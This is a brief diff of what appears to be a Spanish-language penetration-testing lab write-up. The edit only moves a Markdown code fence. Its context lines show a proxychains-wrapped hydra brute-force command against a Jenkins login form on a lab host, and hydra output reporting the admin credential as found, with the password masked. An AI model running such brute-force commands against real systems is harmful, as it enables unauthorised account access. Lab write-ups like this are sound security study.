@@ -122,7 +122,8 @@
         - proxychains hydra 172.17.0.2 -s 8080 -V -f http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in&Login=Login:Invalid username or >
         
         - Contraseña encontrada:
-        ````
+        
+       ````
        [proxychains] Strict chain  ...  127.0.0.1:10101  ...  172.17.0.2:8080 [proxychains] Strict chain  ...  127.0.0.1:10101  ...  172.17.0.2:8080 [8080]            [http-post-form] host: 172.17.0.2
        login: admin   password: *******
        [STATUS] attack finished for 172.17.0.2 (valid pair found)
